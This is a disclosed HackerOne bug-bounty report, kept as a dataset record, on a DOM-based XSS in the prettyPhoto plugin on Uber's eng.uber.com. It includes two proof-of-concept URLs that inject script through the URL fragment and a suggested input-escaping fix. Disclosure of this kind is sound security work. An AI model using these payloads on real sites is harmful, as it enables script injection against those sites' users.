---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '125498'
original_report_id: '125498'
title: Dom Based Xss
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2016-03-23T19:14:25.212Z'
disclosed_at: '2016-05-09T22:27:41.305Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Dom Based Xss

## Metadata

- HackerOne Report ID: 125498
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-05-09T22:27:41.305Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi. found dom xss on this subdomain  eng.uber.com. you are using a vulnerable plugin prettyPhoto..
This XSS will work in Firefox,Chrome - Google and IE last version ! And this is very dangerous!
POC 
Firefox vector
http://eng.uber.com/#prettyPhoto[i]/x,<svg/onload=alert(document.domain)>/x
POC 
Google and IE
http://eng.uber.com/#prettyPhoto[gallery]/1,<a onclick="alert(document.domain);">/


Add screenshot
How to fix the vulnerability,upgrade the plugin or add the filter
hashIndex = parseInt(hashIndex) 
hashRel = hashRel.replace(/([ #;&,.+*~\':"!^$[]()=>|\/])/g,'\$1');

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
